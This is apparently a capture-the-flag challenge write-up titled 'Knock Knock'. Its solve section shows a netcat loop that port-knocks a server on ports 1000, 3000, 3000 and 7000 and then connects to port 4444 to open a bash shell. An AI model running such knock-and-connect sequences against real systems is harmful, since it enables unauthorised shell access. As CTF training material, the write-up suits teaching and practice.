# Knock Knock

This server appears to respond to some kind of entrance code...

Competitors must port knock to get a bash shell to open

> Competitors are given "config.ini"

## Solve
```bash
TARGET=1000
for p in 1000 3000 3000 7000; do nc -vz <target> $p; done
nc <target> 4444 # Open the shell
```
